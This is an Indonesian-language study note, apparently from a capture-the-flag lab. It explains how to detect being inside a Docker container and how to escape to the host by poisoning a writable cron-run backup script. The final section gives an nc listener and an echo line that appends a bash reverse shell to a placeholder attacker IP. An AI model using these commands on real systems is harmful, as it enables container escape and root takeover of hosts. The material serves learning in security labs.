# 🐳 Bagian 1: Docker Escape & Pemahaman Isolasi Sistem

Catatan logika dan perintah untuk mendeteksi kontainer terisolasi serta taktik kabur (*Docker Escape*) ke komputer utama (*host*).

---

## 🧐 1. Pemahaman Isolasi: Apakah Hanya Ada Docker?
**Tidak.** Docker hanyalah salah satu aplikasi paling populer untuk mengisolasi sistem. Di dunia nyata atau server perusahaan, teknik "kurungan virtual" ini memiliki banyak nama:
*   **Docker / Kubernetes (K8s)**: Kontainer modern yang sangat ringan.
*   **LXC / LXD (Linux Containers)**: Kontainer bawaan Linux untuk membagi server.
*   **Chroot Jail**: Kurungan tradisional yang mengunci *user* di dalam satu folder spesifik.
*   **Virtual Machine (VM)**: Virtualisasi total (seperti VirtualBox/VMware) yang mengisolasi hingga perangkat kerasnya.

---

## 🕵️‍♂️ 2. Indikator: Cara Mengetahui Kita Terkurung di Docker
Saat berhasil mendapatkan terminal akses (*reverse shell*), jangan langsung berasumsi itu adalah komputer asli. Cek ciri-ciri berikut:

1.  **Nama Host Acak**: Ketik `hostname`. Jika hasilnya kombinasi angka dan huruf acak panjang (Contoh: `f1a2b3c4d5e6`), itu tanda kontainer.
2.  **Adanya Berkas Penanda**: Ketik `ls -la /`. Jika ada file kosong bernama **`.dockerenv`**, kamu 100% di dalam Docker.
3.  **Proses Terbatas**: Ketik `cat /proc/1/cgroup`. Jika teksnya penuh dengan kata `docker`, sistem kamu dibatasi.
4.  **Perintah Minimalis**: Banyak perintah standar Linux seperti `ping`, `ifconfig`, `sudo`, atau `nano` yang hilang (*command not found*).

---

## 🛠️ 3. Logika Analisis: Bagaimana Menemukan Jalan Keluar?
Di dalam Docker, cari folder yang terhubung langsung dengan komputer asli (*Volume Sharing*). Lokasinya tidak selalu di `/opt`, admin bebas menaruhnya di mana saja (seperti `/var/www`, `/mnt`, atau `/home`).

### Cara Melacak Folder "Bagi Dua" di Server Lain:
```bash
# Mengintip folder mana yang ditempel (mounted) dari luar harddisk virtual
mount | grep -v "tmpfs"
```

### Cara Mengetahui Skrip Otomatis (`.sh`) Berjalan di Komputer Asli:
1.  **Cek Waktu File Modifikasi**: Ketik `ls -la`. Jika ada berkas arsip (seperti `backup.tar`) yang jam modifikasinya berubah otomatis setiap menit, artinya ada robot otomatis (*Cron Job*) yang bekerja di latar belakang.
2.  **Logika Fungsi**: Jika skrip berisi perintah *backup* data besar, secara logika itu dijalankan oleh komputer asli untuk mengamankan data keluar dari kontainer Docker.

---

## 🚀 4. Perintah Eksekusi Akhir (The Escape)
Jika menemukan skrip otomatis (contoh: `backup.sh`) yang bisa ditulis (`writable`) oleh akses `root` Docker kamu, racuni skrip tersebut untuk menyerang komputer asli.

1. **Buka pintu pendengar baru di Kali Linux (Port Berbeda):**
```bash
nc -lvnp 5555
```

2. **Suntikkan perintah reverse shell ke dalam skrip otomatis tersebut:**
```bash
echo "bash -c 'bash -i >& /dev/tcp/<IP_KALI_TUN0>/5555 0>&1'" >> backup.sh
```

3. **Duduk manis selama 1 menit.** Begitu komputer asli mengeksekusi jadwal menitan skrip tersebut, terminal Netcat port `5555` kamu akan otomatis menangkap akses `root` komputer utama (luar Docker).
```bash
# Setelah koneksi masuk, cek lokasi asli
whoami       # Hasil: root
cd /root
cat flag4.txt
```
